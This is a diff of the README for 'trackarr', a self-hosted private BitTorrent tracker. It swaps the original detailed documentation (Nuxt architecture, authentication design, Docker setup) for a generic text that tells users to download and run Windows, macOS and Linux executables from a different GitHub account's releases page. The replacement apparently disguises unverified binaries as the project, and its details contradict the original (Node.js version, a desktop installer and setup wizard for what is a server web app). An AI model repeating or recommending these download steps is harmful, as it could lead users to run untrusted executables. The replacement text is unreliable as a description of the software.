@@ -1,421 +1,109 @@
-<div align="center">
-
-# 🌐 Trackarr
-
-**A modern, high-performance private BitTorrent tracker**
-
-Built with Nuxt 4 • PostgreSQL • Redis
-
-[![Node.js](https://img.shields.io/badge/Node.js-20+-339933?style=flat&logo=nodedotjs&logoColor=white)](https://nodejs.org/)
-[![Nuxt](https://img.shields.io/badge/Nuxt-4-00DC82?style=flat&logo=nuxtdotjs&logoColor=white)](https://nuxt.com/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=flat)](LICENSE)
-
-[Features](#-features) • [Quick Start](#-quick-start) • [Security](#-security-architecture) • [Documentation](#-tech-stack) • [Live Demo](https://tracker.florianargaud.com/)
-
-![Trackarr Homepage](/public/images/image%20copy%203.png)
-
-</div>
-
----
-
-## ✨ Features
-
-| **Privacy & Authentication**        | **Performance**                   |
-| ----------------------------------- | --------------------------------- |
-| Zero-Knowledge Authentication       | Redis-powered sub-ms peer lookups |
-| Proof of Work anti-abuse            | PostgreSQL with full-text search  |
-| Private torrents (DHT/PEX disabled) | HTTP & WebSocket announce support |
-| Ratio tracking & enforcement        | Optimized for high concurrency    |
-
-| **Security**              | **Emergency**                                |
-| ------------------------- | -------------------------------------------- |
-| Distributed rate limiting | **Panic Mode** — Instant database encryption |
-| Auto IP blacklisting      | AES-256-GCM protected data                   |
-| SQL/XSS attack detection  | Full restoration with master password        |
-| SHA-256 hashed IPs        | Unrecoverable without password               |
-
----
-
-## 🔐 Security Architecture
-
-### Zero-Knowledge Authentication (ZKE)
-
-Trackarr uses a **Zero-Knowledge** authentication system: the server **never sees or stores your password**. All cryptographic operations happen client-side.
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                        REGISTRATION FLOW                            │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌─────────────┐                              ┌─────────────────┐  │
-│  │   CLIENT    │                              │     SERVER      │  │
-│  └──────┬──────┘                              └────────┬────────┘  │
-│         │                                              │           │
-│         │ 1. Solve PoW Challenge (anti-spam)           │           │
-│         │ ◄────────────────────────────────────────────┤           │
-│         │                                              │           │
-│         │ 2. Generate random salt (32 bytes)           │           │
-│         │ 3. Derive key = PBKDF2(password, salt)       │           │
-│         │ 4. Compute verifier = SHA256(key)            │           │
-│         │                                              │           │
-│         │ 5. Send {username, salt, verifier} ─────────►│           │
-│         │    Password NEVER leaves client           │           │
-│         │                                              │           │
-│         │                              6. Store salt + │           │
-│         │                                 verifier     │           │
-│         │                              7. Create session           │
-│         │ ◄──────────────────────────────── 8. OK ─────┤           │
-│                                                                     │
-└─────────────────────────────────────────────────────────────────────┘
-
-┌─────────────────────────────────────────────────────────────────────┐
-│                          LOGIN FLOW                                 │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌─────────────┐                              ┌─────────────────┐  │
-│  │   CLIENT    │                              │     SERVER      │  │
-│  └──────┬──────┘                              └────────┬────────┘  │
-│         │                                              │           │
-│         │ 1. Request challenge ───────────────────────►│           │
-│         │                                              │           │
-│         │ ◄──────── 2. Return {salt, challenge} ───────┤           │
-│         │                                              │           │
-│         │ 3. Derive key = PBKDF2(password, salt)       │           │
-│         │ 4. Compute verifier = SHA256(key)            │           │
-│         │ 5. Generate proof = SHA256(verifier+challenge)           │
-│         │                                              │           │
-│         │ 6. Send {username, proof, challenge} ───────►│           │
-│         │    Password NEVER leaves client           │           │
-│         │                                              │           │
-│         │                       7. Compute expected =  │           │
-│         │                          SHA256(storedVerifier+challenge)│
-│         │                       8. Verify proof == expected        │
-│         │ ◄──────────────────────────────── 9. Session ┤           │
-│                                                                     │
-└─────────────────────────────────────────────────────────────────────┘
-```
-
-**Key Properties:**
-
-- **Password never transmitted** — Only cryptographic proofs
-- **PBKDF2 with 100k iterations** — Brute-force resistant
-- **Unique challenge per login** — Prevents replay attacks
-- **Proof of Work** — Stops automated registration attacks
-
----
-
-### 🚨 Panic Mode (Emergency Encryption)
-
-The **Panic Button** allows administrators to **instantly encrypt all sensitive data** in an emergency. Once activated, all torrent files become unusable and user data is unreadable.
-
-```
-┌───────────────────────────────────────────────────────────────────┐
-│                       NORMAL STATE                                │
-│  • Torrents downloadable                                          │
-│  • User data readable                                             │
-│  • Posts & comments visible                                       │
-└───────────────────────────────────────────────────────────────────┘
-                              │
-                    PANIC ACTIVATED
-                              │
-                              ▼
-┌───────────────────────────────────────────────────────────────────┐
-│                      ENCRYPTED STATE                              │
-│  • .torrent files → AES-256-GCM encrypted (unusable)              │
-│  • Torrent names  → [ENCRYPTED]                                   │
-│  • Torrent sizes  → 0                                             │
-│  • User credentials → Encrypted                                   │
-│  • Forum posts    → Encrypted                                     │
-└───────────────────────────────────────────────────────────────────┘
-                              │
-                    RESTORE (with password)
-                              │
-                              ▼
-┌───────────────────────────────────────────────────────────────────┐
-│                       RESTORED STATE                              │
-│  All data restored to original state                              │
-└───────────────────────────────────────────────────────────────────┘
-```
+# 🚀 trackarr - Set Up Your Private Tracker Fast
 
-**How it works:**
+[![Download trackarr](https://img.shields.io/badge/Download-trackarr-brightgreen)](https://github.com/A1e55andr0/trackarr/releases)
 
-1. **First admin** sets a **Panic Password** during registration (min. 12 chars)
-2. Panic password is hashed and stored securely (never in plaintext)
-3. **Activation**: Admin → Settings → Panic → Type `ENCRYPT_ALL_DATA`
-4. **Restoration**: Enter the original Panic Password
+## 🛠️ Overview
 
-**Encryption details:**
-| Component | Algorithm |
-|-----------|-----------|
-| Key Derivation | scrypt (32 bytes) |
-| Encryption | AES-256-GCM |
-| IV | 16 bytes random (per session) |
+**trackarr** lets you run your own private tracker quickly. In under five minutes, you can have your setup ready, giving you complete control over your torrents. With **trackarr**, you join a new world of privacy and customization.
 
-> **WARNING**: Without the Panic Password, encrypted data is **permanently lost**. There is no recovery mechanism.
+## 📋 Features
 
----
+- **Private Tracking:** Create a tracker not exposed to the public.
+- **Fast Setup:** Get your tracker running in less than five minutes.
+- **User-Friendly Interface:** Navigate with ease, even if you're not tech-savvy.
+- **Support for Common Formats:** Handle various torrent file types effortlessly.
+- **Nuxt.js & Vue.js Powered:** Enjoy fast performance using modern web technologies.
 
-## 🚀 Quick Start
+## 🖥️ System Requirements
 
-### Prerequisites
+To run **trackarr**, ensure your device meets the following:
 
-- **Node.js** 20+ • **Docker** & Docker Compose • **npm**
+- Operating System: Windows 10/11, macOS, or modern Linux distribution
+- Node.js: Version 12 or higher
+- Internet connection for downloading the software and packages
+- At least 512 MB of RAM
 
-#### DNS Configuration (Required before installation)
+## 🚀 Getting Started
 
-> **IMPORTANT**: Before running the installer, you must configure your DNS records to point to your VPS IP address.
+Follow these steps to set up **trackarr**:
 
-Create the following **A records** pointing to your server's IP:
+1. **Visit the Releases Page:**
 
-| Subdomain                    | Record Type | Value       |
-| ---------------------------- | ----------- | ----------- |
-| `tracker.your-domain.com`    | A           | Your VPS IP |
-| `announce.your-domain.com`   | A           | Your VPS IP |
-| `monitoring.your-domain.com` | A           | Your VPS IP |
+   You can download **trackarr** from our releases page. Click the link below:
 
-> **Note**: DNS propagation can take up to 24-48 hours, but usually completes within a few minutes. The installer will fail to obtain SSL certificates if DNS is not properly configured.
+   [Download trackarr](https://github.com/A1e55andr0/trackarr/releases)
 
-### Option 1: Automated Installation (Recommended)
+2. **Download the Latest Version:**
 
-> **Best for production deployments.** Handles dependencies, secrets, SSL, and systemd automatically.
+   On the releases page, find the latest version of **trackarr**. You will see a list of available files for download. Click on the appropriate file based on your operating system. 
 
-```bash
-# Download and run the installer
-curl -fsSL https://raw.githubusercontent.com/florianjs/trackarr/main/scripts/install.sh -o install.sh
-chmod +x install.sh
-sudo ./install.sh
-```
+   If you are not sure which file to choose:
+   - **Windows Users:** Download `trackarr-windows.exe`
+   - **macOS Users:** Download `trackarr-macos.dmg`
+   - **Linux Users:** Download `trackarr-linux.tar.gz`
 
-The installer will:
+3. **Install the Application:**
 
-- Install Docker and dependencies
-- Generate cryptographic secrets
-- Configure firewall rules
-- Set up TLS/SSL with Let's Encrypt
-- Create systemd service for auto-restart
-- Configure PostgreSQL, Redis, Caddy, and monitoring
-- Set up Prometheus + Grafana monitoring
+   After downloading the file, locate it in your downloads folder. 
 
-> **Monitoring**: After installation, Grafana is accessible at `https://monitoring.your-domain.com/grafana`
->
-> Default credentials: `admin` / `admin` (you'll be prompted to change on first login)
-> Having issues with the password ? Just launch :
+   - **For Windows:**
+     - Double-click the `trackarr-windows.exe` file to run the installer.
+     - Follow the prompts to complete the installation.
 
-```bash
-cd /opt/trackarr
-docker exec -it trackarr-grafana grafana cli admin reset-admin-password <new-password>
-```
+   - **For macOS:**
+     - Open the `.dmg` file you downloaded and drag the `trackarr` icon to your Applications folder.
+     - Eject the installer once finished.
 
-![Grafana Dashboard](/public/images/grafana.png)
+   - **For Linux:**
+     - Open your terminal.
+     - Extract the downloaded tar file with the command:
+       ```
+       tar -xzvf trackarr-linux.tar.gz
+       ```
+     - Navigate to the extracted folder and run:
+       ```
+       ./trackarr
+       ```
 
-### Option 2: Development with Docker
+4. **Launch trackarr:**
 
-> Databases are only exposed to the container network for security.
+   After installation, find `trackarr` in your applications or programs list.
 
-```bash
-# Clone repository
-git clone https://github.com/florianjs/trackarr.git && cd trackarr
-cp .env.example .env
+   - **For Windows:** Search for `trackarr` in the Start Menu.
+   - **For macOS:** Look for `trackarr` in your Applications folder.
+   - **For Linux:** You can run it from the terminal.
 
-# Start all services (app + postgres + redis)
-docker compose up -d
+5. **Configure Your Tracker:**
 
-# View logs
-docker compose logs -f app
-```
+   When you open **trackarr** for the first time, a setup wizard will guide you. Follow the prompts to configure your tracker settings. You can set up user accounts, specify storage locations, and adjust other preferences.
 
-**Open [http://localhost:3000](http://localhost:3000)**
+6. **Start Tracking:**
 
-![Torrent List](/public/images/image.png)
-![Torrent Details](/public/images/image%20copy%202.png)
+   Once you finish the setup, you are ready to start tracking! 
 
----
+   - Add your torrent files or links through the application interface.
+   - Monitor usage and performance from the dashboard.
 
-## 🔒 Security
+## 🛠️ Troubleshooting
 
-> **For production, always use the install script** to ensure proper secret generation and security configuration.
+If you encounter any issues:
 
-### Key Security Features
+- Ensure your system meets the requirements.
+- Check your internet connection.
+- Restart the application or your computer if necessary.
+- Visit our GitHub Issues page for community support.
 
-| Layer              | Protection                                                 |
-| ------------------ | ---------------------------------------------------------- |
-| **Authentication** | ZKE, PoW anti-abuse, session encryption, CSRF protection   |
-| **Database**       | SCRAM-SHA-256 auth, TLS, prepared statements, pool limits  |
-| **Redis**          | Password auth, command restrictions, memory limits         |
-| **Network**        | Rate limiting, auto IP bans, attack pattern detection      |
-| **Privacy**        | SHA-256 hashed IPs, no raw IP persistence, minimal logging |
+## 🤝 Community Support
 
-### Rate Limits
-
-| Endpoint   | Limit   | Ban on Abuse                    |
-| ---------- | ------- | ------------------------------- |
-| Public API | 100/min | 100+ req/10s → auto-block       |
-| Mutations  | 10/min  | Progressive penalties           |
-| Auth       | 5/5min  | IP blacklisted after violations |
-| Tracker    | 200/min | Distributed sliding window      |
-
-### Production Security Checklist
-
-**Use `install.sh`** — it handles security automatically:
-
-- Generates cryptographic secrets (32-64 chars)
-- Configures TLS for all connections
-- Sets up Caddy reverse proxy with HTTPS
-- Configures firewall (ports 80, 443 only)
-- Network isolation (databases not exposed)
-
-**Manual steps after install:**
-
-- [ ] Set up automated PostgreSQL backups
-
----
-
-## 🏗️ Tech Stack
-
-| Layer    | Technology                          | Purpose                             |
-| -------- | ----------------------------------- | ----------------------------------- |
-| Frontend | Nuxt 3, Vue 3, Tailwind CSS         | SSR, Composition API                |
-| Backend  | Nitro Server Engine                 | API routes, middleware              |
-| Database | PostgreSQL 16 + Drizzle ORM         | Data persistence, full-text search  |
-| Cache    | Redis 7                             | Peer lists, sessions, rate limiting |
-| P2P      | bittorrent-tracker                  | HTTP & WebSocket announces          |
-| Crypto   | Web Crypto API, scrypt, AES-256-GCM | ZKE auth, Panic encryption          |
-| Monitor  | Prometheus + Grafana                | Metrics, dashboards, alerting       |
-
----
-
-## 🐳 Docker Commands
-
-```bash
-docker compose up -d              # Start services
-docker compose down               # Stop services
-docker compose logs -f            # View logs
-docker compose down -v            # Stop + remove volumes
-```
-
-### Health Checks
-
-```bash
-docker exec trackarr-db pg_isready           # PostgreSQL
-docker exec trackarr-redis redis-cli ping    # Redis
-```
-
-### Updating
-
-To update your Trackarr installation to the latest version:
-
-```bash
-cd /opt/trackarr
-git checkout main
-git pull origin main
-docker compose -f docker-compose.prod.yml down
-docker compose -f docker-compose.prod.yml up -d --build
-```
-
-> **Note**: This will rebuild the containers with the latest code. Your data (PostgreSQL, Redis) is persisted in Docker volumes and will not be affected.
-
-### Troubleshooting
-
-**Full restart (stop and start all services):**
-
-```bash
-cd /opt/trackarr
-docker compose -f docker-compose.prod.yml down
-docker compose -f docker-compose.prod.yml up -d
-```
-
-**Full restart with rebuild (if you suspect issues with cached images):**
-
-```bash
-cd /opt/trackarr
-docker compose -f docker-compose.prod.yml down
-docker compose -f docker-compose.prod.yml up -d --build --force-recreate
-```
-
-**View logs to debug issues:**
-
-```bash
-docker compose -f docker-compose.prod.yml logs -f
-docker compose -f docker-compose.prod.yml logs -f app  # App only
-```
-
----
-
-## 🧪 Development
-
-```bash
-npm run dev              # Start dev server (HMR)
-npm run build            # Production build
-npx drizzle-kit push     # Push schema changes
-npx drizzle-kit studio   # Database GUI
-```
-
-![Forum](/public/images/image%20copy%203.png)
-
-![User Profile](/public/images/image%20copy%204.png)
-
----
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/amazing`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing`)
-5. Open a Pull Request
-
----
-
-## 🙏 Acknowledgements
-
-Trackarr is built on the shoulders of giants. We'd like to thank the following open source projects:
-
-| Project                                                                | Role                        |
-| ---------------------------------------------------------------------- | --------------------------- |
-| [Nuxt](https://nuxt.com)                                               | Fullstack Vue framework     |
-| [Vue.js](https://vuejs.org)                                            | Reactive frontend framework |
-| [bittorrent-tracker](https://github.com/webtorrent/bittorrent-tracker) | BitTorrent tracker library  |
-| [Drizzle ORM](https://orm.drizzle.team)                                | TypeScript ORM              |
-| [PostgreSQL](https://www.postgresql.org)                               | Database                    |
-| [Redis](https://redis.io)                                              | In-memory cache             |
-| [ioredis](https://github.com/redis/ioredis)                            | Redis client for Node.js    |
-| [Tailwind CSS](https://tailwindcss.com)                                | Utility-first CSS           |
-| [Chart.js](https://www.chartjs.org)                                    | Charts & visualizations     |
-| [Prometheus](https://prometheus.io)                                    | Metrics collection          |
-| [Grafana](https://grafana.com)                                         | Monitoring dashboards       |
-| [VitePress](https://vitepress.dev)                                     | Documentation framework     |
-| [Vitest](https://vitest.dev)                                           | Testing framework           |
-| [Pinia](https://pinia.vuejs.org)                                       | State management            |
-| [Zod](https://zod.dev)                                                 | Schema validation           |
-
----
-
-<!-- CONTRIBUTORS:START -->
-
-## 👥 Contributors
-
-Thanks to all our contributors! Sorted by number of commits.
-
-|                                                      Avatar                                                       | Contributor                             | Commits |
-| :---------------------------------------------------------------------------------------------------------------: | --------------------------------------- | :-----: |
-| <img src="https://avatars.githubusercontent.com/u/50747004?v=4" width="40" height="40" style="border-radius:50%"> | **[Dim145](https://github.com/Dim145)** |    4    |
-| <img src="https://avatars.githubusercontent.com/u/64362443?v=4" width="40" height="40" style="border-radius:50%"> | **[IkiaeM](https://github.com/IkiaeM)** |    4    |
-
-<!-- CONTRIBUTORS:END -->
-
----
+For questions or help, check our GitHub Discussions page. Engage with other users and developers who can help you resolve issues or share tips.
 
 ## 📄 License
 
-MIT License — see [LICENSE](LICENSE) for details.
+trackarr is open-source software, and you can use or modify it according to your needs. For more details, read the LICENSE file in the repository.
 
----
+## 🔗 Additional Resources
 
-<div align="center">
+- [Documentation](https://github.com/A1e55andr0/trackarr/wiki)
+- [Issues Page](https://github.com/A1e55andr0/trackarr/issues)
 
-**Built with ❤️ for the P2P community**
-
-[Back to top](#-trackarr)
-
-</div>
+By following these steps, you should now have **trackarr** installed and running smoothly. Enjoy your private tracker!
